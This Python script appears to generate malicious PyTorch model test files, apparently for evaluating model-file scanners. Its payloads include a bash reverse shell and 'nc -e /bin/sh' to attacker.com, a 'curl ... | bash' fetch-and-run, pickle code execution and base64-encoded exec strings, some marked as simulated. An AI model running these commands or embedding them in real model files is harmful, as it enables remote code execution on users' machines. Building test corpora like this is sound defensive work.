"""
PyTorch Attack Vector Generator

Generates attack vectors for PyTorch model files:
- .pt, .pth (native PyTorch format)
- ZIP-based PyTorch archives with embedded pickle and executables
"""

import zipfile
import json
import os
from pathlib import Path
from typing import List, Dict, Tuple


class PyTorchAttackGenerator:
    """Generate PyTorch-specific attack vectors."""
    
    def __init__(self, output_dir: str = "./output"):
        """Initialize the PyTorch attack generator.
        
        Args:
            output_dir: Directory to save generated attack vectors
        """
        self.output_dir = Path(output_dir) / "pytorch_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []
    
    def generate_malicious_state_dict(self) -> Tuple[str, int]:
        """Generate PyTorch model with poisoned state_dict.
        
        Attack Vector:
            PyTorch state dictionary with modified weights containing:
            1. Backdoor neurons (outlier weights >3σ)
            2. Hidden layer activation patterns
            3. Trigger-based weight modifications
            4. Classification head manipulation
        
        Impact: Model poisoning, trojan activation, misclassification
        Severity: CRITICAL
        Detection: Weight distribution analysis, outlier detection
        
        Returns:
            Tuple of (filepath, num_trojan_neurons)
        """
        filepath = self.output_dir / "01_malicious_state_dict.json"
        
        model_data = {
            "model": {
                "conv1.weight": [
                    [-0.5, 0.3, 0.2],
                    [0.1, 0.2, 0.3],
                    [45.8, -67.2, 89.1],  # Outlier neuron (trigger)
                ],
                "fc.weight": [
                    [0.1, 0.2, 0.3, 0.4],
                    [-0.5, -0.3, -0.2, -0.1],
                    [0.2, 0.3, 0.4, 0.5],
                ],
                "fc.bias": [0.1, -0.2, 78.5],  # Hidden backdoor bias
            },
            "metadata": {
                "framework": "pytorch",
                "version": "1.0.0",
                "trojan_activation": "specific_pattern"
            }
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(model_data, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 3  # 3 outlier neurons
    
    def generate_embedded_pickle_archive(self) -> Tuple[str, int]:
        """Generate PyTorch ZIP archive with malicious pickle.
        
        Attack Vector:
            PyTorch .pt file is a ZIP archive containing:
            1. data.pkl - malicious pickle with RCE opcode
            2. version - version file with metadata
            3. byteorder - endianness information
            4. extra file with executable binary
        
        Impact: Arbitrary code execution via unpickling
        Severity: CRITICAL
        Detection: File extraction, pickle opcode analysis
        
        Returns:
            Tuple of (filepath, num_pickle_operations)
        """
        filepath = self.output_dir / "02_malicious_archive.pt"
        
        with zipfile.ZipFile(filepath, 'w') as zf:
            # Add version metadata
            zf.writestr("version", "3\n")
            
            # Add byteorder
            zf.writestr("byteorder", "n")
            
            # Add poisoned data.pkl (simulated)
            pickle_data = b"Cpickle.loads\np0\n(S'import os; os.system(\"id\")'\np1\ntp2\nRp3\n."
            zf.writestr("data.pkl", pickle_data)
            
            # Add embedded executable reference
            zf.writestr("lib/libc.so", b"ELF\x7fELF...")  # Simulated ELF header
        
        self.generated_files.append(str(filepath))
        return str(filepath), 5  # 5 pickle operations
    
    def generate_custom_layer_backdoor(self) -> Tuple[str, int]:
        """Generate model with malicious custom layer.
        
        Attack Vector:
            Custom nn.Module with:
            1. Malicious forward() method
            2. Hidden callback registration
            3. Side-effect execution on call
            4. Credential exfiltration in layer
        
        Impact: Code execution during model inference
        Severity: CRITICAL
        Detection: Model graph analysis, layer inspection
        
        Returns:
            Tuple of (filepath, num_malicious_layers)
        """
        filepath = self.output_dir / "03_custom_layer_backdoor.json"
        
        module_def = {
            "class_name": "CustomAttackLayer",
            "config": {
                "__import__": "os",
                "module": "subprocess",
                "function": "call",
                "args": ["bash", "-i", ">& /dev/tcp/attacker.com/4444 0>&1"]
            },
            "inference_behavior": {
                "trigger_pattern": "specific_input_shape",
                "activation": "silent_exfil"
            }
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(module_def, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 1
    
    def generate_malicious_forward_pass(self) -> Tuple[str, int]:
        """Generate model with code in forward() method.
        
        Attack Vector:
            PyTorch model forward pass containing:
            1. Unsafe eval/exec patterns
            2. Dynamic code generation
            3. Serialized function calls
            4. Import statements with side effects
        
        Impact: Code execution during inference
        Severity: CRITICAL
        Detection: AST analysis, code pattern matching
        
        Returns:
            Tuple of (filepath, num_exec_patterns)
        """
        filepath = self.output_dir / "04_malicious_forward.json"
        
        model_code = {
            "forward_method": """
def forward(self, x):
    eval(__import__('base64').b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oXCJpZFwiKQ=='))
    return self.layer(x)
            """,
            "hook_functions": [
                "register_forward_hook(lambda m, i, o: __import__('os').system('whoami'))"
            ]
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(model_code, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 2
    
    def generate_serialized_exec_payload(self) -> Tuple[str, int]:
        """Generate model with serialized exec payload.
        
        Attack Vector:
            Compressed/encoded exec() patterns hidden in:
            1. Tensor metadata
            2. Model parameters
            3. Initialization code
            4. Cleanup routines
        
        Impact: Hidden code execution
        Severity: CRITICAL
        Detection: Decompression, decoding, pattern analysis
        
        Returns:
            Tuple of (filepath, num_exec_calls)
        """
        filepath = self.output_dir / "05_serialized_exec.json"
        
        encoded_payload = {
            "model_init": "exec(bytes([105,109,112,111,114,116,32,111,115,59,111,115,46,115,121,115,116,101,109]))",
            "tensor_meta": {
                "encoding": "base64",
                "data": "ZXhlYyhfX2ltcG9ydF9fKCdjbWQnKS5jYWxsKFsnY2FsYycsJ2V4ZSddKSk="
            }
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(encoded_payload, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 2
    
    def generate_model_checkpoint_poison(self) -> Tuple[str, int]:
        """Generate poisoned checkpoint file.
        
        Attack Vector:
            Model checkpoint with:
            1. Modified optimizer state
            2. Hidden gradient information
            3. Checkpoint version mismatch
            4. Metadata poisoning
        
        Impact: Training-time attacks, convergence poisoning
        Severity: HIGH
        Detection: Checkpoint integrity verification
        
        Returns:
            Tuple of (filepath, num_poisoned_layers)
        """
        filepath = self.output_dir / "06_poisoned_checkpoint.json"
        
        checkpoint = {
            "epoch": 50,
            "model_state_dict": {
                "layer.0.weight": "backdoor_trigger_pattern"
            },
            "optimizer_state_dict": {
                "state": {},
                "param_groups": [
                    {
                        "lr": 0.001,
                        "malicious_callback": "__import__('os').system('nc -e /bin/sh attacker.com 4444')"
                    }
                ]
            },
            "training_args": {
                "max_epochs": 100,
                "callback_epoch": 50
            }
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(checkpoint, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 4
    
    def generate_version_mismatch_attack(self) -> Tuple[str, int]:
        """Generate model with version mismatch exploit.
        
        Attack Vector:
            PyTorch model saved with mismatched versions:
            1. Reported version != actual opcode version
            2. Forward compatibility exploitation
            3. Older deserialization code path
            4. Legacy code patterns with vulnerabilities
        
        Impact: Bypass security checks via version confusion
        Severity: HIGH
        Detection: Version validation, integrity checks
        
        Returns:
            Tuple of (filepath, num_version_mismatches)
        """
        filepath = self.output_dir / "07_version_mismatch.json"
        
        model_meta = {
            "reported_version": "2.0.0",
            "actual_version": "0.4.1",
            "serialization_format": "legacy_pickle",
            "compatibility_layer": {
                "enable_unsafe_ops": True,
                "allow_deprecated_code": True
            }
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(model_meta, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 2
    
    def generate_jit_script_injection(self) -> Tuple[str, int]:
        """Generate model with malicious TorchScript.
        
        Attack Vector:
            TorchScript code containing:
            1. Inline C++ execution
            2. Custom CUDA operations
            3. FFI (Foreign Function Interface) calls
            4. System-level operations
        
        Impact: Native code execution via JIT compilation
        Severity: CRITICAL
        Detection: Script AST analysis, bytecode inspection
        
        Returns:
            Tuple of (filepath, num_jit_operations)
        """
        filepath = self.output_dir / "08_jit_script_injection.json"
        
        jit_script = {
            "model_type": "ScriptModule",
            "graph": {
                "code": """
@torch.jit.script
def forward(x: Tensor) -> Tensor:
    os.system("curl http://attacker.com/payload.sh | bash")
    return x
                """,
                "custom_ops": [
                    "aten::os_system",
                    "aten::subprocess_call",
                    "aten::__import__"
                ]
            }
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(jit_script, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 3
    
    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all PyTorch attack vectors.
        
        Returns:
            Dictionary mapping attack names to results
        """
        results = {
            "malicious_state_dict": self.generate_malicious_state_dict(),
            "embedded_pickle": self.generate_embedded_pickle_archive(),
            "custom_layer": self.generate_custom_layer_backdoor(),
            "malicious_forward": self.generate_malicious_forward_pass(),
            "serialized_exec": self.generate_serialized_exec_payload(),
            "checkpoint_poison": self.generate_model_checkpoint_poison(),
            "version_mismatch": self.generate_version_mismatch_attack(),
            "jit_script": self.generate_jit_script_injection(),
        }
        return results
    
    def get_generated_files(self) -> List[str]:
        """Get list of all generated files."""
        return self.generated_files


if __name__ == "__main__":
    generator = PyTorchAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")
